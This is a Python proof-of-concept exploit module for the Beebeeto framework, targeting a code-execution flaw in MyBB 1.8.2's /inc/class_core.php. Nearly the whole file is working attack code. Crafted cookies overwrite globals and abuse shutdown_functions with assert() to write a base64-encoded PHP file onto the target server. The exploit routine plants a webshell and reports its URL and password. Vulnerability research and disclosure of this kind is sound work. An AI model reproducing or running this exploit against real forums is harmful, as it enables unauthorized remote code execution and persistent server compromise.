#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from base64 import b64encode

from baseframe import BaseFrame
from utils.payload.webshell import PhpShell
from utils.payload.webshell import PhpVerify


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': '',  # 由Beebeeto官方编辑
            'name': 'MyBB 1.8.2 /inc/class_core.php 代码执行漏洞 POC',  # 名称
            'author': 'fyth',  # 作者
            'create_date': '2014-11-21',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer3_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'MyBB',  # 漏洞所涉及的应用名称
            'vul_version': ['1.8.2'],  # 受漏洞影响的应用版本
            'type': 'Code Execution',  # 漏洞类型
            'tag': ['MyBB', '代码执行漏洞'],  # 漏洞相关tag
            'desc': '/inc/class_core.php中对全局变量覆盖撤销可绕过，造成代码执行。',  # 漏洞描述
            'references': [
                'https://gist.github.com/chtg/e9824db42a8edf302b0e',  # 参考链接
            ],
        },
    }

    cookies = {
        'GLOBALS': '1',
        'shutdown_functions[0][function]': 'assert',
        'shutdown_functions[0][arguments][]': "file_put_contents(dirname(__FILE__).'/class_tester.php',"
                                              "base64_decode('{0}'))",
    }

    @classmethod
    def verify(cls, args):
        vul_url = args['options']['target']
        shell_url = vul_url + '/inc/class_tester.php'
        php = PhpVerify()
        cls.cookies['shutdown_functions[0][arguments][]'] = \
            cls.cookies['shutdown_functions[0][arguments][]'].format(b64encode(php.get_content()))
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
            print '[*] Payload Content: ' + cls.cookies['shutdown_functions[0][arguments][]']
        requests.get(vul_url, cookies=cls.cookies)

        if php.check(shell_url):
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            return args
        else:
            args['success'] = False
            return args

    @classmethod
    def exploit(cls, args):
        vul_url = args['options']['target']
        shell_url = vul_url + '/inc/class_tester.php'
        php = PhpShell()
        cls.cookies['shutdown_functions[0][arguments][]'] = \
            cls.cookies['shutdown_functions[0][arguments][]'].format(b64encode(php.get_content()))
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
            print '[*] Payload Content: ' + cls.cookies['shutdown_functions[0][arguments][]']
        requests.get(vul_url, cookies=cls.cookies)

        if php.check(shell_url):
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['Webshell'] = shell_url
            args['poc_ret']['Webshell_PWD'] = php.get_pwd()
            return args
        else:
            args['success'] = False
            return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
